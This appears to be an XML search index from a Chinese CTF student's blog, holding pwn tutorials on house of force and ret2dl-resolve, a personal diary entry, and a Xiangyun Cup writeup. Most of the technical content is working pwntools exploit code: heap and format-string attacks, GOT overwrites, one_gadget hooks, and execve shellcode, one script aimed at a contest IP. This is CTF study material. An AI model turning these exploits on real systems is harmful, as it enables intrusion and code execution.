class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">leng,con</span>):</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak:&quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:&#x27;</span>,p32(<span class="number">0xFFFFFFFF</span>))<span class="comment">#修改top chunk的size</span></span><br><span class="line">top_chunk = leak + <span class="number">0xd0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;top_chunk: &quot;</span> + <span class="built_in">hex</span>(top_chunk)</span><br><span class="line">chunk_addr = <span class="number">0x0804B120</span></span><br><span class="line">offset = chunk_addr - top_chunk - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">&#x27; &#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改heap_array</span></span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>) + p32(free_got) + p32(puts_got) + p32(<span class="number">0x0804B130</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露puts的地址</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got: &quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase  = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase)</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接</p><p><a href="https://blog.csdn.net/haibiandaxia/article/details/108260537">https://blog.csdn.net/haibiandaxia/article/details/108260537</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105588058">https://blog.csdn.net/seaaseesa/article/details/105588058</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>凡是过往，皆为序章</title>
      <link href="/2021/10/30/%E5%87%A1%E6%98%AF%E8%BF%87%E5%BE%80%EF%BC%8C%E7%9A%86%E4%B8%BA%E5%BA%8F%E7%AB%A0/"/>
      <url>/2021/10/30/%E5%87%A1%E6%98%AF%E8%BF%87%E5%BE%80%EF%BC%8C%E7%9A%86%E4%B8%BA%E5%BA%8F%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>之前的 butterfly 主题太难用了，看到学长他们用的新主题，感觉很简约，所以就换了这个主题</p><p>一直没有更新博客是因为不会用 markdown ，当时啥都不懂，包括图片处理什么的，每次写博客都很麻烦，又不好意思请教别人，所以就都写在 OneNote 上了（不得不说能直接粘图片还有随时同步什么的是真的方便，微软打钱！），但是格式也是个很大的弊端，也没有支持代码的插入，虽然很方便，但是不好看。</p><p>和学长他们混熟了之后教会了我很多骚操作（学长们都是超人！！！），感觉自己这十几年一直在用老人机，现在会用了，以后会慢慢把文章挪过来的。</p><hr><p>总结一下过去吧，感觉整个大一下都挺摸鱼的，因为一些个人原因，都没怎么静下心来学网安，现在想想当时的自己挺不负责的，辜负了自己对网安的热爱，也辜负了以前的努力，不过那件事过去之后自己也成熟了很多，也算是一种经历吧。</p><p>暑假去旅了次游，也算是给自己一个缓冲期了，然后也一直在学，虽然知道过去丢下的都弥补不回了，但是也算是有所改变了，迷迷糊糊的进了 V&amp;N ，大二上开始陆陆续续打进一些比赛的线下，重心也慢慢开始偏向网安了，状态也逐渐变得和最开始一样了，每天都很充实，一切都在慢慢变好。</p><p>大二就要接管组长这一职了，是机遇也是挑战，希望能在堆堆和卓哥那多学点，和豪👴经营好整个组吧，也希望网安组能一直很好的走下去……</p><p>未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> 小日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dl</title>
      <link href="/2021/10/30/Ret2dl/"/>
      <url>/2021/10/30/Ret2dl/</url>
      
        <content type="html"><![CDATA[<p>挺难的一个知识点，看了两天也只弄懂一点皮毛，感觉还是因为最底层的东西没有弄懂导致理解困难</p><p><strong>使用情景：</strong>libc地址不好泄露，也没有其他的漏洞，但是可以栈溢出</p><p><strong>原理</strong></p><p>首先需要了解ELF文件结构以及动态链接相关知识</p><p>当程序进行动态链接时，为了能够减少资源的浪费动态链接将连接的过程推迟到了运行的时候，当我们第一次调用一个函数的时候，程序会查找需要链接的各种信息，再通过_dl_runtime_resolve这个函数将正确的地址写进got.plt表中，第二次查询的时候就不需要再走一遍这个过程了，直接就可以调用函数（详见参考博客）</p><p>那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。</p><p><strong>动态链接过程</strong></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588207298627/20b1708fb00c75422f0e0de71ca3a50c5804b6d8.png" alt="1"></p><p>而整个dl函数的过程入下图所示：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588245719719/d078ccc1c92f9b6d92cc23e5a1e218e31b7ceef0.png" alt="2"></p><p><strong>整个过程说白了就是：</strong></p><ol><li>先从 .rel.plt 表里找到某个函数在 .dynsym 里的偏移</li><li>再从 .dynsym 符号表里找函数在 .dynstr 表里的偏移</li><li>再从 .dynstr 表里找到具体的函数对应的字符串，然后将这个字符串解析成函数 </li></ol><p> <strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong></p><p> <strong>攻击:</strong></p><p>可以看到，整个 dl 函数主要是利用了三个表</p><ul><li>.rel.plt</li><li>.dynsym</li><li>dynstr</li></ul><p>那我们要做的就是伪造这三个表，将我们伪造表的偏移当参数传入，这样它就会解析我们想要的函数了</p><p>当然也可以工具一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context </span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">r.recv() </span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">offset = <span class="number">112</span> </span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>) </span><br><span class="line">buf = rop.fill(offset) </span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>) </span><br><span class="line"><span class="comment">## used to call dl_runtimeresolve() </span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base) </span><br><span class="line">r.send(buf) buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf) </span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str </span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"> r.send(buf) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p> <strong>参考链接</strong></p><p> <a href="https://blog.csdn.net/qq_41202237/article/details/107378159">https://blog.csdn.net/qq_41202237/article/details/107378159</a></p><p> <a href="https://xz.aliyun.com/t/5122">https://xz.aliyun.com/t/5122</a></p><p> <a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>祥云杯wp</title>
      <link href="/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/"/>
      <url>/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1><span id="note">Note</span></h1><h2><span id="法一">法一</span></h2><p>整个程序没有 free 功能，第一时间想到 house of orange</p><p>Say 函数里有 scanf(buf)</p><p>scanf(buf) 可以通过 %n$s 来实现 stack地址上任意书写</p><p>利用 scanf 格式化漏洞改 topchunk 地址从而触发 house of orange</p><p>再利用scanf漏洞在malloc中写入realloc，在realloc中写入og</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;47.104.70.90&quot;,25315)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">con</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x26</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">ad = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) + <span class="number">0x28</span></span><br><span class="line">log.info(<span class="string">&quot;ad: &quot;</span> + <span class="built_in">hex</span>(ad))</span><br><span class="line"></span><br><span class="line">say(<span class="string">&quot;%7$x&quot;</span>+<span class="string">&quot;bbbb&quot;</span>+p64(ad))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0xfd1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>):</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content:bbbbbbbb&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x108</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">og = libc_base + <span class="number">0x4527a</span><span class="comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;leak_addr: &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook: &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;og: &quot;</span> + <span class="built_in">hex</span>(og))</span><br><span class="line">log.info(<span class="string">&quot;realloc: &quot;</span> + <span class="built_in">hex</span>(realloc))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span> + <span class="string">&quot;bbbb&quot;</span> + p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(p64(og))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span> + <span class="string">&quot;bbbb&quot;</span> + p64(malloc_hook))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(p64(realloc+<span class="number">13</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;16&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="法二">法二</span></h2><p>利用 scanf 格式化 直接打stdout</p><p>利用stdout泄露出libc</p><p>再打利用 scanf 漏洞打exit_hook,从而getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.104.70.90&#x27;</span>,<span class="number">25315</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(size)</span><br><span class="line">cmd(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">con</span>):</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;%13$s\x00\x00\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x3c36e0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">sys_addr = libc_base + <span class="number">0x453a0</span></span><br><span class="line">_rtld_global = libc_base + <span class="number">0x5f0040</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xcd173</span>,<span class="number">0xcd248</span>,<span class="number">0xf03a4</span>,<span class="number">0xf03b0</span>,<span class="number">0xf1247</span>,<span class="number">0xf67f0</span>]</span><br><span class="line">og = libc_base + one[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;%7$s\x00\x00\x00\x00&quot;</span>+p64(_rtld_global+<span class="number">3848</span>))</span><br><span class="line">p.sendline(p64(og))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="jigsawscage">JigSaw’sCage</span></h1><p>scanf处有漏洞，实际读入了 %ld 的内容，从而可以覆盖掉v2</p><p>覆盖掉v2后，让v2&gt;14</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/xiangyunbei-wp/1635584852428781/6af8743f82efcdeda46ac9b27947bf6a641c3e66.png" alt="q"></p><p>就能利用mprotect函数给堆地址加权限(7:rwx)</p><p>然后再在堆中写入shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;47.104.71.220&#x27;,10273)</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">cmd(idx)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;hhhh&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100000000000</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>              *可以通过x/i查看这些机器码的意思</span><br><span class="line">sc2 = <span class="string">&quot;\xf7\xe6\x50\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span>     </span><br><span class="line">pay = sc1 + p8(<span class="number">0xe9</span>)+p8(<span class="number">0x11</span>)+p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pay = pay.ljust(<span class="number">16</span>,<span class="string">&#x27;\xc3&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,sc2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">gift(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 祥云杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大总结</title>
      <link href="/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/"/>
      <url>/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/</url>
      
